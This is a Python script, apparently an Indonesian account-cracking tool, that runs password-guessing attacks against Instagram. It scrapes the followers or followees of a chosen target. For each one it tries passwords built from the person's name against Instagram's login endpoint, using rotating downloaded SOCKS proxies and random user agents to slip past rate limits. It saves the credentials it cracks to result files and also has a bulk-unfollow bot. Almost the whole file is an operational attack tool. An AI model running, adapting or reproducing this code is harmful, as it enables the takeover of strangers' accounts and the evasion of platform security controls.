# coding:utf-8
#/usr/bin/python
try:
    import json
    import uuid
    import hmac
    import random
    import hashlib
    import urllib
    import stdiomask
    import urllib.request
    import calendar
    import requests
except ImportError as e:
    exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
    
###----------[ IMPORT MODULE AND INGredIENT ]---------- ###
import rich
from rich.markdown import Markdown
import os, sys, subprocess, platform
import os
try:
    import requests
except ImportError:
    print('\n [×] Modul requests belum terinstall!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [×] Modul Futures belum terinstall!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [×] Modul Bs4 belum terinstall!...\n')
    os.system('pip install bs4')

try:
	import stdiomask
except ImportError:
	catet_mask = ('# • sedang menginstall modul stdiomask •')
	mask = rich.markdown.Markdown(catet_mask, style='green')
	rich.console.Console().print(mask)
	os.system('pip install stdiomask')
	
bff_2 = open(os.devnull, "w")
my_music = subprocess.call(["dpkg","-s","play-audio"],stdout=bff_2,stderr=subprocess.STDOUT)
bff_2.close()
if my_music !=0:
	catet_play = ('# • sedang menginstall play-audio •')
	play = rich.markdown.Markdown(catet_play, style='green')
	rich.console.Console().print(play)
	os.system('pkg install play-audio')
import requests,bs4,json,os,sys,random,datetime,time,re
try:
    import rich
except ImportError:
    os.system('pip install rich')
    time.sleep(1)
    try:
        import rich
    except ImportError:
        exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
from rich import print as asep
import time
###----------[ IMPORT RICH AND INGredIENT ]---------- ###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich import print as printer
from rich.console import Console
from rich.console import Console as sol
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()
day=datetime.now().strftime("%d-%b-%Y")
ttl=datetime.now().strftime("%d %b %Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'
menudump=[]
def folder():
	try:os.mkdir('data')
	except:pass
	try:os.mkdir('result')
	except:pass
	
    
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print('GAGAL')
    
prox=open('.prox.txt','r').read().splitlines()
try:
	os.system('curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt -o socks5.txt')
except:
	pass
sock=open('socks5.txt','r').read().splitlines()
CY='\033[96;1m'
H='\033[1;32m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
U='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
#USN="Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 213.1.0.22.117 (iPhone13,2; iOS 15_0_2; en_US; en-US; scale=3.00; 1170x2532; 332048479)"
# USN="Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; Huawei Social Phone Build/HWIX3) AppleWebKit/533.1 (KHTML, like Gecko) Dolphin/10.1.1005.22 Mobile Safari/533.1"
USN="Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; MITO A68 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.2.599 U3/0.8.0 Mobile Safari/534.30 Instagram 213.1.0.22.117 (iPhone13,2; iOS 15_0_2; en_US; en-US; scale=3.00; 1170x2532; 332048479)"
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
ua=open('ua.txt','r').read().splitlines()
s=requests.Session()
# CLEAR
def clear():
    os.system('clear')
 
###----------[ GET TIME ]---------- ###
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Selamat pagi"
	elif 12 <= hours < 15:timenow = "Selamat siang"
	elif 15 <= hours < 18:timenow = "Selamat malam"
	else:timenow = "Selamat malam"
	return timenow

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 
		
###----------[ LOGO ]---------- ###
def banner():
    os.system('clear')
    cetak(nel(f"""[white] \t[green1]<  8u11 4n0nym0u5 >
 ----------------
    \
     \
                                   .::!!!!!!!:.
  .!!!!!:.                        .:!!!!!!!!!!!!
  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$
      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P
      $$$$$##WX!:      .<!!!!UW$$$$  $$$$$$$$#
      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*
      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R
        *$bd$$$$      *$$$$$$$$$$$o+
         [white] Author by: LukmanXD
""",style='#808000',title='[white] Lukman'))

try:
    # python 2
    urllib_quote_plus = urllib.quote
except:
    # python 3
    urllib_quote_plus = urllib.parse.quote_plus
 


def cekAPI(cookie):
    user=open('.username','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':cookie},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except  (ValueError,KeyError):
        cetak(nel(f"""[white][[green]•[white]] Akun Instagram Terkena Checkpoint"""))
        time.sleep(4)
        os.remove('.kukis.log')
        os.remove('.username')
        exit()

    return external,user

def login_kamu():
    if "sukses" in lisensiku:
        try:
            kuki=open('.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            cetak(nel(f"""[white][[green]1[white]] Login Menggunakan Cookie""",style="#808000",title='[white]Login Dulu Anjing Anak Haram Lu'))
            loginpil=input(f"  [\033[31m•\033[0m] Chouse :{C} ")
            if loginpil=='1':
                cetak(nel(f""" [white]Gunakan username dan cookies instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat""",style="#808000"))
                us=input(f'  [\033[31m•\033[0m] Username :{C}')
                cok=input(f'  [\033[31m•\033[0m] Cookie :{C}')
                kuki=open('.kukis.log','w').write(cok)
                user=open('.username','w').write(us)
                asep(Panel.fit("[white][[green]•[white]] Login Sucsesfully Silahkan Run Kembali"))
                sleep(2.3)
                exit()
            elif loginpil == '2':
                cetak(nel(f"""[white][[green]•[white] Sedang Dalam Perbaikan""",style="#808000"));exit()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:
        login()
def login():
    global external
    try:
        print('\n[•] Gunakan username dan password instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat')
        us=input(f"[•] Username: {C}")
        pw=stdiomask.getpass(prompt=f'[•] Password: {C}')
    except KeyboardInterrupt:
        wel = '# KeyboardInterrupt terdeteksi... keluar !'
        wel2 = mark(wel, style='green')
        sol().print(wel2)
        exit()
    x=instagramAPI(us,pw).loginAPI()
    if x.get('status')=='success':
        open('.username','a').write(us)
        open('.kukis.log','a').write(x.get('cookie'))
        cookie={'cookie':x.get('cookie')}
        print(f'\n{H}>{C} Login berhasil')
        login_kamu()
    elif x.get('status')=='checkpoint':
        wel = '# Login checkpoint'
        wel2 = mark(wel, style='green')
        sol().print(wel2)
        login()
    else:
        wel = '# Username atau password yang anda masukan salah'
        wel2 = mark(wel, style='green')
        sol().print(wel2)
        login()


class instagram:
    def __init__(self,external,username,cookie):
        self.ext=external
        self.username=username
        self.cookie=cookie
        self.s=requests.Session()
    def logo(self):
        for i in external:
            try:
                nama=i.split('|')[0]
                followers=i.split('|')[1]
                following=i.split('|')[2]
            except:
                pass
            banner()
            cetak(nel(f"""[white][[green]•[white]] Username  : {self.username}\n[white][[green]•[white]] Followers : {followers} • {following}\n[white][[green]•[white]] Bergabung : {ttl}""",style='#808000',title="[white]%s[white]"%(nama)))
            cetak(nel(f"""[white][[green]1[white]] Crack Dari Pencarian     [[green]2[white]] Crack Dari Pengikut    
[[green]3[white]] Crack Dari Mengikuti     [[green]4[white]] Ontap Checkpoin Joss [new]
[[green]5[white]] Lihat Hasil Crack        [[green]6[white]] Bot Auto Unfollow
[[green]7[white]] Laporkan Bug             [[green]8[white]] logout""",style="#808000"))
            


    def BUG(self):
        cetak(nel(f"""[white][[green]•[white]] Masukan Pesan Untuk Di Kirim Ke Admin"""))
        i=input('  [\033[31m•\033[0m] Pesan : ')
        print('  [\033[31m•\033[0m] Pesan Anda : \033[32m%s \033[0mAkan Segera Terkirim Mohon Tunggu....'%(i));time.sleep(2)
        os.system('xdg-open https://wa.me/6285794270820?text=%s'%(i))
        exit()

    def ChangeLog(self):
        io='[1] Fix bug login instagram\n[2] Ganti tampilan scripts\n[3] Fix bug lisensi invalid'
        oi = nel(io, style='magenta')
        cetak(nel(oi, title='Fitur yang di update'))

        io='[1] Bot unfollow instagram\n[2] Bot spam komen'
        oi = nel(io, style='cyan')
        cetak(nel(oi, title='Fitur tambahan'))

        io='[1] Untuk fitur brute force masih dalam perbaikan\n[2] Untuk fitur Bot unfollow masih dalam perbaikan\n[3] Untuk fitur bot komen masih dalam perbaikan'
        oi = nel(io, style='magenta')
        cetak(nel(oi, title='Fix Bug'))
        exit()

    def Exit(self):
        x=input(f'  [\033[31m•\033[0m] Apakah anda ingin keluar y/t > ')
        if x in ('y','Y'):
            os.remove('.kukis.log')
            os.remove('.username')
            login_kamu()
        elif x in ('t','T'):
            login_kamu()
        else:
            self.Exit()

    def sixAPI(self,six_id):
        url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
        x = requests.get(url)
        x_jason = x.json()
        uid = str( x_jason['users'][0].get("user").get("pk") )
        return uid

    def unfollowAPI(self,user_id,username_id,cookie):
        uuid=generateUUID(True)
        xx=self.s.get("https://www.instagram.com/",headers={"user-agent":USN}).content
        crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
        s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': USN})

        data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})

        self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
            self.generateUUID(False),
            urllib.request.quote(data))
        return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text


    def searchAPI(self,cookie,nama):
        try:
            x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
            x_jason=json.loads(x.text)
            for i in x_jason['users']:
                user=i['user']
                username=user['username']
                fullname=user['full_name']
                internal.append(f'{username}|{fullname}')
        except requests.exceptions.ConnectionError:
            exit(f'  [{M}!{C}] Koneksi internet bermasalah')
        return internal

    def idAPI(self,cookie,id):
        if 'sukses' in lisensiku:
            try:
                m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
                m_jason=m.json()["data"]["user"]
                idx=m_jason["id"]
            except requests.exceptions.ConnectionError:
                exit(f"  [\033[31m•\033[0m] Koneksi internet bermasalah{C}")
            except Exception as e:
                exit(f"  [\033[31m•\033[0m] Username yang anda masukan tidak di temukan pastikan target bersifat publik{C}")
            return idx
        else:lisensi()

    def infoAPI(self,cookie,api,id):
        if 'sukses' in  lisensiku:
            try:
                cetak(nel(f"""[white][[green]•[white]] Tunggu Sedang Mengumpulkan User""",style="#808000"))
                x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
                x_jason=json.loads(x.text)
                for i in x_jason['users']:
                    username = i["username"]
                    nama = i["full_name"]
                    internal.append(f'{username}|{nama}')
                    following.append(username)
                if 'pengikut' in menudump:
                    maxid=x_jason['next_max_id']
                    for z in range (9999):
                        x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
                        x_jason=json.loads(x.text)
                        try:
                            for i in x_jason['users']:
                                username = i["username"]
                                nama = i["full_name"]
                                internal.append(f'{username}|{nama}')
                                following.append(username)
                            try:
                                 maxid=x_jason['next_max_id']
                            except:
                                break
                        except:
                            if 'challenge' in x.text:
                                break
                            else:
                                continue
                else:pass
            except requests.exceptions.ConnectionError:
                exit(f'  [\033[31m•\033[0m] Koneksi internet bermasalah{C}')
            except Exception as e:
                print(f'  [\033[31m•\033[0m] Username yang anda masukan tidak di temukan{C}')
            return internal
        else:lisensi()

    def passwordAPI(self,xnx):
        print('  [\033[31m•\033[0m] Total User : %s'%(len(internal)))
        cetak(nel(f"""[white][[green]1[white]] FirstName123 Firstname1234\n[[green]2[white]] FirtsName123 Firstname1234 Firstname12345 FullName\n[[green]3[white]] FirstName+123,FullName,Full Name\n[[green]4[white]] Password Manual""",style="#808000"))
        c=input(f'  [\033[31m•\033[0m] Password : ')
        if c=='1':
            self.generateAPI(xnx,c)
        elif c=='2':
            self.generateAPI(xnx,c)
        elif c=='3':
            self.generateAPI(xnx,c)
        elif c=='7':
            self.generateAPI(xnx,c)
        elif c=='4':
            ui='# PASSWORD MANUAL'
            uu=mark(ui,style='')
            sol().print(uu)
            print(f'{M}  Contoh sayang,anjing,bangsat')
            print('')
            zx=input(f'  [\033[31m•\033[0m] List password :{C} ')
            self.generateAPI(xnx,c,zx)
        else:
            self.passwordAPI(xnx)

    def generateAPI(self,user,o,zx=''):
        global prog,des
        prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
        des = prog.add_task('',total=len(internal))
        cetak(nel(f"""[white][[green]•[white]] Hasil OK disimpan ke: result/{day}.txt\n[white][[green]•[white]] Hasil CP disimpan ke: result/{day}.txt""",style="#808000",subtitle='[white]Jika alamat IP di-spam, aktifkan mode pesawat selama 10 detik'));print('')
        with prog:
            with ThreadPoolExecutor(max_workers=15) as shinkai:
                for i in user:
                    try:
                        username=i.split("|")[0]
                        password=i.split("|")[1].lower()
                        for w in password.split(" "):
                            if len(w)<3:
                                continue
                            else:
                                w=w.lower()
                            if o=="1":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w+'1234']
                                else:
                                    sandi=[w]
                            elif o=="2":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w,w+'1234',w+'12345']
                                else:
                                    sandi=[w+'123',w,w+'1234',w+'12345']
                            elif o=="3":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w,password.lower()]
                                else:
                                    sandi=[w+'123',w,password.lower()]
                            elif o=="7":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w+'1234',w+'12345',w]
                                else:
                                    sandi=[w+'123',w+'1234',w+'12345',password.lower()]
                            elif o=="4":
                                if len(zx) > 3:
                                    sandi = zx.replace(" ", "").split(",")
                                else:
                                    break
                            shinkai.submit(self.crackAPI,username,sandi)
                    except:
                        pass
        print('  [\033[31m•\033[0m] Crack Selesai Tod.......')
        exit()

    def APIinfo(self,user):
        try:
            x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
            x_jason=x.json()["data"]["user"]
            nama=x_jason["full_name"]
            pengikut=x_jason["edge_followed_by"]["count"]
            mengikut=x_jason["edge_follow"]["count"]
            postingan=x_jason["edge_owner_to_timeline_media"]["count"]
        except:
            pass

        return nama,pengikut,mengikut,postingan

    def crackAPI(self,user,pas):
        global loop,success,checkpoint
        prog.update(des,description=f"crack {str(loop)}/{len(internal)} OK : {H}{len(success)}{N} CP : {K}{len(checkpoint)}{N}")
        prog.advance(des)
        try:
            for pw in pas:
                ts = calendar.timegm(current_GMT)
                nip=random.choice(prox)
                proxs= {'http': 'socks4://'+nip}
                aa='Mozilla/5.0 (Linux; U; Android 2.3.4; en-us;'
                b=random.choice(['4','5','6','7','8','9','10','11','12'])
                c='T-Mobile myTouch 3G Slide Build/GRI40)'
                d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                e=random.randrange(1, 999)
                f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                g='AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
                h=random.randrange(73,100)
                i='0'
                j=random.randrange(4200,4900)
                k=random.randrange(40,150)
                l='Mobile Safari/533.1'
                uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
                token=s.get('https://www.instagram.com/accounts/login/?next=/accounts/logout/')
                headers = {
                    'Host': 'www.instagram.com',
                    'x-ig-www-claim': '0',
					'x-instagram-ajax': '1005633336-hot',
					'content-type': 'application/x-www-form-urlencoded',
					'accept': '*/*',
					'x-requested-with': 'XMLHttpRequest',
					'x-asbd-id': '198387',
					'user-agent': uaku,
					'x-csrftoken': token.cookies['csrftoken'],
					'x-ig-app-id': '1217981644879628',
					'origin': 'https://www.instagram.com',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'empty',
					'referer': 'https://www.instagram.com/accounts/login/?next=/accounts/logout/',
					'accept-encoding': 'gzip, deflate',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
                }
#					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),


                param={
                    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
                    "username": user,
                    "optIntoOneTap": 'false',
                    "queryParams": "{}",
                    "stopDeletionNonce": "",
                    "trustedDeviceRecords": "{}"}
                x=s.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param,proxies=proxs)
                x_jason=json.loads(x.text)
                if "userId" in str(x_jason):
                    coki = (f'mid={ses.cookies.get_dict()["mid"]};ig_did={ses.cookies.get_dict()["ig_did"]};ig_nrcb=1;shbid="9776\0541986587953\0541674289809:01f713acdf5c4921a542aff43695805d8e788f5580f4efaaf714ca7301ba34bb727790c9";shbts="1642753809\0541986587953\0541674289809:01f7227f6219fb0a036e3593c1531e9b9c9eb1db9dcbb7b4590ba36ffcbe62715eb10ada";csrftoken={ses.cookies.get_dict()["csrftoken"]};ds_user_id={ses.cookies.get_dict()["ds_user_id"]};sessionid={ses.cookies.get_dict()["sessionid"]};rur="EAG\0541986587953\0541674477820:01f724c03ff38f24662b1648dd2a933fc4a6e66b7a2bef2458d140bfb76ee86296f6cd8b"');nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    tree = Tree("")
                    tree.add(f"\r{H}{nama}|{user}{N}")
                    tree.add(f"\r{N}Pengikut : {H}{pengikut}{N}")
                    tree.add(f"\r{N}Mengikuti : {H}{mengikut}{N}")
                    tree.add(f"\r{N}Postingan : {H}{postingan}{N}").add(f"\r{N}User Agent : {H}{uaku}{N}")
                    prints(tree)
                    os.popen("play-audio data/dapet.mp3")
                    open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    success.append(user)
                    break
                elif 'checkpoint_url' in str(x_jason):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    tree = Tree("")
                    tree.add(f"\r{M}{nama}|{user} {N} ")
                    tree.add(f"\r{N}Pengikut : {K}{pengikut}{N}")
                    tree.add(f"\r{N}Mengikuti : {K}{mengikut}{N}")
                    tree.add(f"\r{N}Postingan : {H}{postingan}{N}").add(f"\r{N}Status : {H} Login gagal Lord ×{N}")
                    prints(tree)
                    open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    checkpoint.append(user)
                    break

                elif 'Please wait a few minutes' in str(x.text):
                    sys.stdout.write(f"\r  [\033[31m•\033[0m] IP KENA SPAM TUNGGU BEBERAPA MENIT{C}");sys.stdout.flush();sleep(0)
					#self.crackAPI(user,pas)
    #            elif 'ip_block' in str(x.text):
   #                 sys.stdout.write(f"\r┣[{U}!{C}] {U}IP DI BLOKIR ON OFF MODE PESAWAT{C}");sys.stdout.flush();sleep(0)
  #                  self.crackAPI(user,pas)
 #               elif 'spam' in str(x.text):
#                    sys.stdout.write(f"\r┣[{U}!{C}] {U}TERDETEKSI SPAM ON OFF MODE PESAWAT{C}");sys.stdout.flush();sleep(0)
#					self.crackAPI(user,pas)

                else:
                    continue

            loop+=1
        except:
            self.crackAPI(user,pas)

    def checkAPI(self,user,pw):
        try:
            token=s.get("https://www.instagram.com/",headers={"user-agent":USN}).content
            crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
            s.headers.update({
                'authority': 'www.instagram.com',
                'x-ig-www-claim': 'hmac.AR3CH3q3WF_EHwNgjQj_uhjG15AF1ckFwoqU4QVfeHdOiBCT',
                'x-instagram-ajax': '82a581bb9399',
                'content-type': 'application/x-www-form-urlencoded',
                'accept': '*/*',
                'user-agent': USN,
                'x-requested-with': 'XMLHttpRequest',
                'x-csrftoken': crf_token,
                'x-ig-app-id': '936619743392459',
                'origin': 'https://www.instagram.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.instagram.com/',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
            })

            param={
                "username": user,
                "enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
                "optIntoOneTap": False,
                "queryParams": {},
                "stopDeletionNonce": "",
                "trustedDeviceRecords": {}
            }
            x=s.post("https://www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
            x_jason=json.loads(x.text)
            if "userId" in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                tree = Tree("")
                tree.add(f"\r{H}{user}|{pw}{N}")
                tree.add(f"\r{N}Pengikut : {H}{pengikut}{N}")
                tree.add(f"\r{N}Mengikuti : {H}{mengikut}{N}")
                tree.add(f"\r{N}Postingan : {H}{postingan}{N}").add(f"\r{N}Tooken : {H}{crf_token}{N}")
                prints(tree)
                open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                success.append(user)
                
             

            elif 'checkpoint_url' in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                tree = Tree("")
                tree.add(f"\r{M}{nama}|{user} {N} ")
                tree.add(f"\r{N}Pengikut : {K}{pengikut}{N}")
                tree.add(f"\r{N}Mengikuti : {K}{mengikut}{N}")
                tree.add(f"\r{N}Postingan : {K}{postingan}{N}")
                prints(tree)
                checkpoint.append(user)
                
               

            elif 'Please wait a few minutes' in str(x.text):
                sys.stdout.write(f"\r {U}!{C}] {U}Please wait a few minutes second{C}");sys.stdout.flush();sleep(10)
                self.checkAPI(user,pw)
        except:
            self.checkAPI(user,pw)

    def menu(self):
        self.logo()
        c=input(f'  [\033[31m•\033[0m] chouse : ')
        if c=='':
            self.menu()
        elif c in ('1','01'):
            cetak(nel(f"""[white][[green]•[white]] Masukan Jumlah Pencarian """,style="#808000"));m=int(input(f'  [\033[31m•\033[0m] Jumlah : '))
            cetak(nel(f"""[white][[green]•[white]] Masukan Nama Randome""",style="#808000"))
            for i in range(m):
                i+1
                nama=input(f'  [\033[31m•\033[0m] Masukan nama ({H}{len(internal)}{C}): ')
                name=self.searchAPI(self.cookie,nama)
            self.passwordAPI(name)

        elif c in ('2','02'):
            cetak(nel(f"""[white][[green]•[white]] Pastikan Target Instagram Anda Publick""",style="#808000"))
            mas=input('  [\033[31m•\033[0m] anda ingin crack masal? y/t >  ')
            if mas in ['y','Y']:
                masal(self)
            elif mas in ['t','T']:
                massal(self)
            elif mas in ['']:
                print('  [\033[31m•\033[0m] ISI JANGAN KOSONG KENTOD!')


        elif c in ('3','03'):
            cetak(nel(f"""[white][[green]•[white]] Pastikan Target Instagram Anda Publick""",style="#808000"))
            mas=input('  [\033[31m•\033[0m] anda ingin crack masal? y/t >  ')
            if mas in ['y','Y']:
                mengi(self)
            elif mas in ['t','T']:
                meng(self)
            elif mas in ['']:
                print('  [\033[31m•\033[0m] ISI JANGAN KOSONG KENTOD!')


        elif c in ('4','04'):
            print('')
            for i in os.listdir('result'):
                print(f'  [\033[0m\033[31m•\033[0m] •-> {i}')
            c=input(f'\n  [\033[31m•\033[0m] Masukan nama file: {C}')
            g=open("result/%s"%(c)).read().splitlines()
            print(f'  [\033[31m•\033[0m] Total Result Asepitgans {H}{len(g)}{C}')
            print(f'  [\033[31m•\033[0m] Proses mengecek status akun. silahkan tunggu sebentar{C}\n')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                self.checkAPI(usr,pwd)
            exit(f'  [\033[31m#\033[0m] proses check selesai...{C}')

        elif c in ('5','05'):
            print('')
            for i in os.listdir('result'):
                print(f'  [\033[0m\033[31m•\033[0m] •-> {i}')
            c=input(f'\n  [\033[31m•\033[0m] Masukan nama file: ')
            g=open("result/%s"%(c)).read().splitlines()
            xx=c.split("-")
            xc=xx[0]
            print(f'  [\033[31m•\033[0m] Total result yang di temukan [{H}{len(g)}{C}]')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                fol=s.split("|")[2]
                ful=s.split("|")[3]
                if xc=="checkpoint":
                    print(f"""\r\n  {C}*--> Login Checkpoin\_> {M}Gak{C}
  {M}{C}*-->{C} Username  : {M}{usr}{C} - {M}{pwd}{C}
  {M}{C}*-->{C} Pengikut  : {M}{ful}{C} - {M}{fol}{C}
                    """);sleep(0.05)
                else:
                    print(f"""\r\n {C} *--> Login Berhasil\_> {H}Ok{C}
  {H}{C}*-->{C} Username  : {H}{usr}{C} - {H}{pwd}{C}
  {H}{C}*-->{C} Pengikut  : {H}{fol}{C} - {H}{ful}{C}
                    """);sleep(0.05)
        elif c in ('6','06'):
        	cetak(nel(f"""[white][[green]•[white]] Sedang Dalam Perbaikan"""));exit()
        elif c in ('6','06'):
            global following
            six=0
            print(f'\n [{U}!{C}] Bot Unfollow-All Dijalankan\n')
            x=open('.kukis.log','r').read()
            x_id=re.findall('sessionid=(\d+)',x)[0]
            back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id)
            for i in following:
                six+=1
                sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
                six_id=self.sixAPI(i)
                print(f' {str(six)}{U}}}{C} {i} {H}Unfollow-Berhasil{C}')
                self.unfollowAPI(six_id,'5452333948',self.cookie)
                #print(w)
            input(f'\n\n [{U}#{C}] Unfollow-all selesai...');self.menu()

        elif c in ('7','07'):
            self.BUG()
      #  elif c in ('c','C'):
         #   self.ChangeLog()
        elif c in ('8','08'):
            self.Exit()

        else:
            self.menu()
            
          

def mengi(self):
            try:
                menudump.append('pengikut')
                cetak(nel(f"""[white][[green]•[white]] Target harus bersifat publik jangan privat""",style="#808000"))
                m=int(input(f'  [\033[31m•\033[0m] Jumlah : {N}'))
            except:m=1
            for t in range(m):
                t +=1
                print('  [\033[31m•\033[0m] Total User : %s'%({len(internal)}))
                nama=input(f'  [{t}] Masukan Username : ')
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
            self.passwordAPI(info)

def meng(self):
    m=input(f'  [\033[31m•\033[0m] Username : ')

    id=self.idAPI(self.cookie,m)
    info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
    self.passwordAPI(info)

def masal(self):
            try:
                menudump.append('pengikut')
                cetak(nel(f"""[white][[green]•[white]] Target harus bersifat publik jangan privat""",style="#808000"))
                m=int(input(f'  [\033[31m•\033[0m] Jumlah : '))
            except:m=1
            for t in range(m):
                t +=1
                print('  [\033[31m•\033[0m] Total User : %s'%({len(internal)}))
                nama=input(f'  [{t}] Masukan Username : ')
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)



def massal(self):
            menudump.append('pengikut')
           # print('\n[•] Target harus bersifat publik jangan privat')
            m=input(f'  [\033[31m•\033[0m] Username : ')

            id=self.idAPI(self.cookie,m)
            info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)

